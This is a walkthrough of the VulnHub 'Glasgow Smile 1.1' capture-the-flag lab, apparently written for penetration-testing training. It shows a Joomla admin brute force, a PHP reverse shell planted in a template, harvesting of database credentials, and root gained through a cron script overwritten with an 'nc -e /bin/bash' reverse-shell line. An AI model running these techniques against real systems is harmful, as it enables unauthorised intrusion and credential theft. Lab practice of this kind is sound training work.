# VulnHub > Glasgow Smile: 1.1

**About Release**

* Name: Glasgow Smile: 1.1
* Date release: 16 Jun 2020
* Author: mindsflee
* Series: Glasgow Smile

**Description**

* Title: Glasgow Smile
* Users: 5
* Difficulty Level: Initial Shell (Easy) - Privileges Escalation (Intermediate)
* Hint: Enumeration is the key.

If you are a newbie in Penetration Testing and afraid of OSCP preparation, do not worry. Glasgow Smile is supposed to be a kind of gym for OSCP machines.

The machine is designed to be as real-life as possible. Anyway, You will find also a bunch of ctf style challenges, it's important to have some encryption knowledge.

You need to have enough information about Linux enumeration and encryption for privileges escalation.

# Services Enumeration

There are 2 open ports according to Nmap:

~~~
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 67:34:48:1f:25:0e:d7:b3:ea:bb:36:11:22:60:8f:a1 (RSA)
|   256 4c:8c:45:65:a4:84:e8:b1:50:77:77:a9:3a:96:06:31 (ECDSA)
|_  256 09:e9:94:23:60:97:f7:20:cc:ee:d6:c1:9b:da:18:8e (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
~~~

# Web enumeration

Running `gobuster` will reveal a `/joomla` location:

~~~
kali@kali:~$ gobuster dir -u http://glasgowsmile.box/ -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://glasgowsmile.box/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/09/28 15:27:03 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/index.html (Status: 200)
/joomla (Status: 301)
/server-status (Status: 403)
===============================================================
2020/09/28 15:27:06 Finished
===============================================================
~~~

# Joomla

## Version

Running `joomscan` doesn't reveal much. We are able to identify that the version of Joomla is pretty old: version 3.7.3rc1.

~~~
kali@kali:/data/src/joomscan$ perl joomscan.pl -u http://glasgowsmile.box/joomla
    ____  _____  _____  __  __  ___   ___    __    _  _ 
   (_  _)(  _  )(  _  )(  \/  )/ __) / __)  /__\  ( \( )
  .-_)(   )(_)(  )(_)(  )    ( \__ \( (__  /(__)\  )  ( 
  \____) (_____)(_____)(_/\/\_)(___/ \___)(__)(__)(_)\_)
			(1337.today)
   
    --=[OWASP JoomScan
    +---++---==[Version : 0.0.7
    +---++---==[Update Date : [2018/09/23]
    +---++---==[Authors : Mohammad Reza Espargham , Ali Razmjoo
    --=[Code name : Self Challenge
    @OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASP

Processing http://glasgowsmile.box/joomla ...



[+] FireWall Detector
[++] Firewall not detected

[+] Detecting Joomla Version
[++] Joomla 3.7.3rc1

[+] Core Joomla Vulnerability
[++] Target Joomla core is not vulnerable

[+] Checking Directory Listing
[++] directory has directory listing : 
http://glasgowsmile.box/joomla/administrator/components
http://glasgowsmile.box/joomla/administrator/modules
http://glasgowsmile.box/joomla/administrator/templates
http://glasgowsmile.box/joomla/images/banners


[+] Checking apache info/status files
[++] Readable info/status files are not found

[+] admin finder
[++] Admin page : http://glasgowsmile.box/joomla/administrator/

[+] Checking robots.txt existing
[++] robots.txt is found
path : http://glasgowsmile.box/joomla/robots.txt 

Interesting path found from robots.txt
http://glasgowsmile.box/joomla/joomla/administrator/
http://glasgowsmile.box/joomla/administrator/
http://glasgowsmile.box/joomla/bin/
http://glasgowsmile.box/joomla/cache/
http://glasgowsmile.box/joomla/cli/
http://glasgowsmile.box/joomla/components/
http://glasgowsmile.box/joomla/includes/
http://glasgowsmile.box/joomla/installation/
http://glasgowsmile.box/joomla/language/
http://glasgowsmile.box/joomla/layouts/
http://glasgowsmile.box/joomla/libraries/
http://glasgowsmile.box/joomla/logs/
http://glasgowsmile.box/joomla/modules/
http://glasgowsmile.box/joomla/plugins/
http://glasgowsmile.box/joomla/tmp/


[+] Finding common backup files name
[++] Backup files are not found

[+] Finding common log files name
[++] error log is not found

[+] Checking sensitive config.php.x file
[++] Readable config files are not found


Your Report : reports/glasgowsmile.box/
~~~

## Brute force admin authentication 

Let's try to brute force the authentication page (http://glasgowsmile.box/joomla/administrator/). Let's creaate the following list of possible users:

~~~
$ cat users.txt
admin
joker
joomla
~~~

For possible passwords, we'll extract the content of the main Joomla page using `cewl`:

~~~
kali@kali:/data/GlasgowSmile_1.1/files$ cewl -d 3 -w dict.txt http://glasgowsmile.box/joomla
CeWL 5.4.8 (Inclusion) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
~~~

Joomla authentication can't be brute forced with hydra because of the changing token (read more here: https://www.securityartwork.es/2013/02/14/nmap-script-http-joomla-brute-where-thc-hydra-doesnt-fit/). For this reason, we'll use a Nmap script called `http-joomla-brute`.

You'll need to modify the file `/usr/share/nmap/scripts/http-joomla-brute.nse` to adapt the following variable:

~~~
local DEFAULT_JOOMLA_LOGIN_URI = "/joomla/administrator/index.php"
~~~

Here is the result of the attack:

~~~
kali@kali:/data/GlasgowSmile_1.1/files$ nmap -sV --script http-joomla-brute --script-args 'userdb=users.txt,passdb=dict.txt' glasgowsmile.box 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-28 16:24 CEST
Nmap scan report for glasgowsmile.box (172.16.222.148)
Host is up (0.0011s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
| http-joomla-brute: 
|   Accounts: 
|     joomla:Gotham - Valid credentials
|_  Statistics: Performed 97 guesses in 7 seconds, average tps: 13.9
|_http-server-header: Apache/2.4.38 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.88 seconds
~~~

# Reverse Shell

Use these credentials (`joomla:Gotham`) to authenticate against the admin page (http://glasgowsmile.box/joomla/administrator/). Once authenticated, edit the "Beez3" template > "error.php" and replace the code with a PHP reverse shell.

Start a listener (`rlwrap nc -nlvp 4444`) and browse the Beez3 error page (http://glasgowsmile.box/joomla/templates/beez3/error.php).

We now have a reverse shell:

~~~
kali@kali:/data/GlasgowSmile_1.1/files$ rlwrap nc -nlvp 4444
listening on [any] 4444 ...
connect to [172.16.222.128] from (UNKNOWN) [172.16.222.148] 41196
Linux glasgowsmile 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64 GNU/Linux
 12:03:34 up 13 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ which python
/usr/bin/python
$ python -c "import pty;pty.spawn('/bin/bash')"
www-data@glasgowsmile:/$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
~~~

# Lateral move (www-data -> rob)

## MySQL connection details

Now connected as `www-data`, we obviously want to switch to a user that is in the `/home` directory. Analyzing the Joomla configuration file will disclose the database connection details:

~~~
www-data@glasgowsmile:/var/www/joomla2$ cat configuration.php
cat configuration.php
<?php

  [REDACTED]

  public $dbtype = 'mysqli';
  public $host = 'localhost';
  public $user = 'joomla';
  public $password = 'babyjoker';
  public $db = 'joomla_db';
  public $dbprefix = 'jnqcu_';

  [REDACTED]
~~~

## MySQL Databases

Let's use the credentials to connect to the database and list the databases we can access:

~~~
}www-data@glasgowsmile:/var/www/joomla2$ mysql -u joomla -p
mysql -u joomla -p
Enter password: babyjoker

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 66
Server version: 10.3.22-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| batjoke            |
| information_schema |
| joomla_db          |
| mysql              |
| performance_schema |
+--------------------+
5 rows in set (0.003 sec)
~~~

## Credentials in the batjoke database

Interestingly, the user is not only granted access to the Joomla database, but also to `batjoke`: 

~~~
MariaDB [(none)]> use batjoke;
use batjoke;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [batjoke]> show tables;
show tables;
+-------------------+
| Tables_in_batjoke |
+-------------------+
| equipment         |
| taskforce         |
+-------------------+
2 rows in set (0.001 sec)

MariaDB [batjoke]> select * from equipment;
select * from equipment;
Empty set (0.001 sec)

MariaDB [batjoke]> select * from taskforce;
select * from taskforce;
+----+---------+------------+---------+----------------------------------------------+
| id | type    | date       | name    | pswd                                         |
+----+---------+------------+---------+----------------------------------------------+
|  1 | Soldier | 2020-06-14 | Bane    | YmFuZWlzaGVyZQ==                             |
|  2 | Soldier | 2020-06-14 | Aaron   | YWFyb25pc2hlcmU=                             |
|  3 | Soldier | 2020-06-14 | Carnage | Y2FybmFnZWlzaGVyZQ==                         |
|  4 | Soldier | 2020-06-14 | buster  | YnVzdGVyaXNoZXJlZmY=                         |
|  6 | Soldier | 2020-06-14 | rob     | Pz8/QWxsSUhhdmVBcmVOZWdhdGl2ZVRob3VnaHRzPz8/ |
|  7 | Soldier | 2020-06-14 | aunt    | YXVudGlzIHRoZSBmdWNrIGhlcmU=                 |
+----+---------+------------+---------+----------------------------------------------+
6 rows in set (0.001 sec)
~~~

The `taskforce` table contains a list of potential users with base64 encoded passwords. Once decoded, it results in the following list:

name |  password (base64) | password (clear)
---|---|---
Bane | YmFuZWlzaGVyZQ== | baneishere
Aaron | YWFyb25pc2hlcmU= | aaronishere
Carnage | Y2FybmFnZWlzaGVyZQ== | carnageishere
buster | YnVzdGVyaXNoZXJlZmY= | busterishereff
rob | Pz8/QWxsSUhhdmVBcmVOZWdhdGl2ZVRob3VnaHRzPz8/ | ???AllIHaveAreNegativeThoughts???
aunt | YXVudGlzIHRoZSBmdWNrIGhlcmU= | auntis the fuck here 

## Connect as rob

As `rob` is also a user of the system, let's try to connect using the decoded password:

~~~
www-data@glasgowsmile:/var/www/joomla2$ su rob
su rob
Password: ???AllIHaveAreNegativeThoughts???

rob@glasgowsmile:/var/www/joomla2$ id
id
uid=1000(rob) gid=1000(rob) groups=1000(rob),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
rob@glasgowsmile:/var/www/joomla2$ 
~~~

# Flag 1

A first flag is found in `rob`'s home:

~~~
rob@glasgowsmile:/var/www/joomla2$ cd
cd
rob@glasgowsmile:~$ ls -la
ls -la
total 52
drwxr-xr-x 3 rob  rob  4096 Jun 16 13:04 .
drwxr-xr-x 5 root root 4096 Jun 15 06:34 ..
-rw-r----- 1 rob  rob   454 Jun 14 03:20 Abnerineedyourhelp
-rw------- 1 rob  rob     7 Sep 28 11:49 .bash_history
-rw-r--r-- 1 rob  rob   220 Jun 13 12:51 .bash_logout
-rw-r--r-- 1 rob  rob  3526 Jun 13 12:51 .bashrc
-rw-r----- 1 rob  rob   313 Jun 14 03:23 howtoberoot
drwxr-xr-x 3 rob  rob  4096 Jun 13 16:27 .local
-rw------- 1 rob  rob    81 Jun 15 04:08 .mysql_history
-rw-r--r-- 1 rob  rob   807 Jun 13 12:51 .profile
-rw-r--r-- 1 rob  rob    66 Jun 15 04:14 .selected_editor
-rw-r----- 1 rob  rob    38 Jun 13 16:41 user.txt
-rw------- 1 rob  rob   429 Jun 16 13:04 .Xauthority
rob@glasgowsmile:~$ cat user.txt
cat user.txt
JKR[f5bb11acbb957915e421d62e7253d27a]
~~~

# Lateral move (rob -> abner)

There is an interesting encoded file in our home:

~~~
rob@glasgowsmile:~$ cat Abnerineedyourhelp
cat Abnerineedyourhelp
Gdkkn Cdzq, Zqsgtq rteedqr eqnl rdudqd ldmszk hkkmdrr ats vd rdd khsskd rxlozsgx enq ghr bnmchshnm. Sghr qdkzsdr sn ghr eddkhmf zants adhmf hfmnqdc. Xnt bzm ehmc zm dmsqx hm ghr intqmzk qdzcr, "Sgd vnqrs ozqs ne gzuhmf z ldmszk hkkmdrr hr odnokd dwodbs xnt sn adgzud zr he xnt cnm's."
Mnv H mddc xntq gdko Zamdq, trd sghr ozrrvnqc, xnt vhkk ehmc sgd qhfgs vzx sn rnkud sgd dmhflz. RSLyzF9vYSj5aWjvYFUgcFfvLCAsXVskbyP0aV9xYSgiYV50byZvcFggaiAsdSArzVYkLZ==
~~~

This message is encoded with the Caesar cipher (offset of 1). We can easily decode it:

~~~
$ echo "Gdkkn Cdzq, Zqsgtq rteedqr eqnl rdudqd ldmszk hkkmdrr ats vd rdd khsskd rxlozsgx enq ghr bnmchshnm. Sghr qdkzsdr sn ghr eddkhmf zants adhmf hfmnqdc. Xnt bzm ehmc zm dmsqx hm ghr intqmzk qdzcr, Sgd vnqrs ozqs ne gzuhmf z ldmszk hkkmdrr hr odnokd dwodbs xnt sn adgzud zr he xnt cnm's. Mnv H mddc xntq gdko Zamdq, trd sghr ozrrvnqc, xnt vhkk ehmc sgd qhfgs vzx sn rnkud sgd dmhflz. RSLyzF9vYSj5aWjvYFUgcFfvLCAsXVskbyP0aV9xYSgiYV50byZvcFggaiAsdSArzVYkLZ==" | tr 'A-Za-z' 'B-ZA-Ab-za-a'
Hello Dear, Arthur suffers from severe mental illness but we see little sympathy for his condition. This relates to his feeling about being ignored. You can find an entry in his journal reads, The worst part of having a mental illness is people expect you to behave as if you don't. Now I need your help Abner, use this password, you will find the right way to solve the enigma. STMzaG9wZTk5bXkwZGVhdGgwMDBtYWtlczQ0bW9yZThjZW50czAwdGhhbjBteTBsaWZlMA==
~~~

Now, let's decode the password:

~~~
$ echo "STMzaG9wZTk5bXkwZGVhdGgwMDBtYWtlczQ0bW9yZThjZW50czAwdGhhbjBteTBsaWZlMA==" | base64 -d
I33hope99my0death000makes44more8cents00than0my0life0
~~~

We can now switch to `abner`:

~~~
rob@glasgowsmile:/home$ su abner
su abner
Password: I33hope99my0death000makes44more8cents00than0my0life0

abner@glasgowsmile:/home$ id
id
uid=1001(abner) gid=1001(abner) groups=1001(abner)
~~~

# Flag 2

The second flag in in `abner`'s home:

~~~
abner@glasgowsmile:/home$ cd abner
cd abner
abner@glasgowsmile:~$ ls -la
ls -la
total 44
drwxr-xr-x 4 abner abner 4096 Jun 16 12:54 .
drwxr-xr-x 5 root  root  4096 Jun 15 06:34 ..
-rw------- 1 abner abner  167 Sep 28 11:49 .bash_history
-rw-r--r-- 1 abner abner  220 Jun 14 02:53 .bash_logout
-rw-r--r-- 1 abner abner 3526 Jun 14 02:53 .bashrc
-rw-r----- 1 abner abner  565 Jun 16 11:44 info.txt
drwxr-xr-x 3 abner abner 4096 Jun 14 16:03 .local
-rw-r--r-- 1 abner abner  807 Jun 14 02:53 .profile
drwx------ 2 abner abner 4096 Jun 15 10:43 .ssh
-rw-r----- 1 abner abner   38 Jun 16 12:54 user2.txt
-rw------- 1 abner abner  399 Jun 15 07:54 .Xauthority
abner@glasgowsmile:~$ cat user2.txt
cat user2.txt
JKR{0286c47edc9bfdaf643f5976a8cfbd8d}
~~~

# Lateral move (abner -> penguin)

Let's switch to SSH now to free the reverse shell.

~~~
sshpass -p "I33hope99my0death000makes44more8cents00than0my0life0" ssh abner@glasgowsmile.box
~~~

The last user is `penguin`, but there is apparently no file that would help us switch to this user. After searching for files by users, groups, ... I eventually searched for files which name would contain the string "penguin" and found an interesting zip archive, hidden in the Joomla subfolders:

~~~
abner@glasgowsmile:~$ find / -type f -name "*penguin*" 2>/dev/null
/var/www/joomla2/administrator/manifests/files/.dear_penguins.zip
~~~

Unzip the archive with the same password as the user's password (`I33hope99my0death000makes44more8cents00than0my0life0`):

~~~
abner@glasgowsmile:/var/www/joomla2/administrator/manifests/files$ cp .dear_penguins.zip ~/dear_penguins.zip
abner@glasgowsmile:/var/www/joomla2/administrator/manifests/files$ cd 
abner@glasgowsmile:~$ unzip dear_penguins.zip 
Archive:  dear_penguins.zip
[dear_penguins.zip] dear_penguins password: 
  inflating: dear_penguins           
~~~

It results in a clear text file containing penguin's password:

~~~
abner@glasgowsmile:~$ cat dear_penguins
My dear penguins, we stand on a great threshold! It's okay to be scared; many of you won't be coming back. Thanks to Batman, the time has come to punish all of God's children! First, second, third and fourth-born! Why be biased?! Male and female! Hell, the sexes are equal, with their erogenous zones BLOWN SKY-HIGH!!! FORWAAAAAAAAAAAAAARD MARCH!!! THE LIBERATION OF GOTHAM HAS BEGUN!!!!!
scf4W7q4B4caTMRhSFYmktMsn87F35UkmKttM5Bz
~~~

Switch user with the password `scf4W7q4B4caTMRhSFYmktMsn87F35UkmKttM5Bz`

~~~
abner@glasgowsmile:~$ su penguin
Password: 
penguin@glasgowsmile:/home/abner$ id
uid=1002(penguin) gid=1002(penguin) groups=1002(penguin)
~~~

# Flag 3

The third flag is available in `/home/penguin/SomeoneWhoHidesBehindAMask/user3.txt`:

~~~
penguin@glasgowsmile:~$ ls -la /home/penguin/
total 40
drwxr-xr-x 5 penguin penguin 4096 Jun 16 11:58 .
drwxr-xr-x 5 root    root    4096 Jun 15 06:34 ..
-rw------- 1 penguin penguin    7 Sep 28 11:49 .bash_history
-rw-r--r-- 1 penguin penguin  220 Jun 15 06:34 .bash_logout
-rw-r--r-- 1 penguin penguin 3526 Jun 15 06:34 .bashrc
drwxr-xr-x 3 penguin penguin 4096 Jun 15 12:01 .local
-rw-r--r-- 1 penguin penguin  807 Jun 15 06:34 .profile
drwxr--r-- 2 penguin penguin 4096 Jun 16 12:52 SomeoneWhoHidesBehindAMask
drwx------ 2 penguin penguin 4096 Jun 15 11:22 .ssh
-rw------- 1 penguin penguin   58 Jun 15 11:20 .Xauthority
penguin@glasgowsmile:~$ cd SomeoneWhoHidesBehindAMask/
penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ ls -la
total 332
drwxr--r-- 2 penguin penguin   4096 Jun 16 12:52 .
drwxr-xr-x 5 penguin penguin   4096 Jun 16 11:58 ..
-rwSr----- 1 penguin penguin 315904 Jun 15 11:45 find
-rw-r----- 1 penguin root      1457 Jun 15 11:50 PeopleAreStartingToNotice.txt
-rwxr-xr-x 1 penguin root       612 Jun 16 12:50 .trash_old
-rw-r----- 1 penguin penguin     38 Jun 16 12:52 user3.txt
penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ cat user3.txt 
JKR{284a3753ec11a592ee34098b8cb43d52}
penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ 
~~~

# Flag 4

## Privilege escalation

Running pspy64 on the target will reveal that a cronjob is executing `/home/penguin/SomeoneWhoHidesBehindAMask/.trash_old` by root every minute:

~~~
2020/09/28 13:43:01 CMD: UID=0    PID=1584   | /usr/sbin/CRON -f 
2020/09/28 13:43:01 CMD: UID=0    PID=1585   | /usr/sbin/CRON -f 
2020/09/28 13:43:01 CMD: UID=0    PID=1586   | /bin/sh -c /home/penguin/SomeoneWhoHidesBehindAMask/.trash_old 
2020/09/28 13:44:01 CMD: UID=0    PID=1587   | /usr/sbin/CRON -f 
2020/09/28 13:44:01 CMD: UID=0    PID=1588   | /usr/sbin/CRON -f 
2020/09/28 13:44:01 CMD: UID=0    PID=1589   | /bin/sh -c /home/penguin/SomeoneWhoHidesBehindAMask/.trash_old 
~~~

Let's modify the file to make a reverse shell:

~~~
penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ cat > .trash_old << EOF
> nc -e /bin/bash 172.16.222.128 5555
> EOF
~~~

Start a listener and wait for the connection:

~~~
kali@kali:/data/src$ rlwrap nc -nlvp 5555
listening on [any] 5555 ...
connect to [172.16.222.128] from (UNKNOWN) [172.16.222.148] 49746
python3 -c "import pty;pty.spawn('/bin/bash')"
root@glasgowsmile:~# pwd
pwd
/root
root@glasgowsmile:~# ls -la
ls -la
total 48
drwx------  3 root root 4096 Jun 16 13:23 .
drwxr-xr-x 18 root root 4096 Jun 13 12:44 ..
-rw-------  1 root root    7 Sep 28 11:49 .bash_history
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
-rwxr-x--x  1 root root  867 Jun 16 13:23 .clean.sh
drwxr-xr-x  3 root root 4096 Jun 13 13:12 .local
-rw-------  1 root root 3862 Jun 15 04:07 .mysql_history
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r-----  1 root root 1863 Jun 14 15:07 root.txt
-rw-r--r--  1 root root   66 Jun 13 15:52 .selected_editor
-rw-r--r--  1 root root  165 Jun 13 13:11 .wget-hsts
-rw-r--r--  1 root root   24 Jun 16 13:18 whoami
~~~

## Root flag

We are now able to read the root flag:

~~~
root@glasgowsmile:~# cat root.txt
cat root.txt
  ▄████ ██▓   ▄▄▄       ██████  ▄████ ▒█████  █     █░     ██████ ███▄ ▄███▓██▓██▓   ▓█████ 
 ██▒ ▀█▓██▒  ▒████▄   ▒██    ▒ ██▒ ▀█▒██▒  ██▓█░ █ ░█░   ▒██    ▒▓██▒▀█▀ ██▓██▓██▒   ▓█   ▀ 
▒██░▄▄▄▒██░  ▒██  ▀█▄ ░ ▓██▄  ▒██░▄▄▄▒██░  ██▒█░ █ ░█    ░ ▓██▄  ▓██    ▓██▒██▒██░   ▒███   
░▓█  ██▒██░  ░██▄▄▄▄██  ▒   ██░▓█  ██▒██   ██░█░ █ ░█      ▒   ██▒██    ▒██░██▒██░   ▒▓█  ▄ 
░▒▓███▀░██████▓█   ▓██▒██████▒░▒▓███▀░ ████▓▒░░██▒██▓    ▒██████▒▒██▒   ░██░██░██████░▒████▒
 ░▒   ▒░ ▒░▓  ▒▒   ▓▒█▒ ▒▓▒ ▒ ░░▒   ▒░ ▒░▒░▒░░ ▓░▒ ▒     ▒ ▒▓▒ ▒ ░ ▒░   ░  ░▓ ░ ▒░▓  ░░ ▒░ ░
  ░   ░░ ░ ▒  ░▒   ▒▒ ░ ░▒  ░ ░ ░   ░  ░ ▒ ▒░  ▒ ░ ░     ░ ░▒  ░ ░  ░      ░▒ ░ ░ ▒  ░░ ░  ░
░ ░   ░  ░ ░   ░   ▒  ░  ░  ░ ░ ░   ░░ ░ ░ ▒   ░   ░     ░  ░  ░ ░      ░   ▒ ░ ░ ░     ░   
      ░    ░  ░    ░  ░     ░       ░    ░ ░     ░             ░        ░   ░     ░  ░  ░  ░



Congratulations!

You've got the Glasgow Smile!

JKR{68028b11a1b7d56c521a90fc18252995}


Credits by

mindsflee
root@glasgowsmile:~# 
~~~
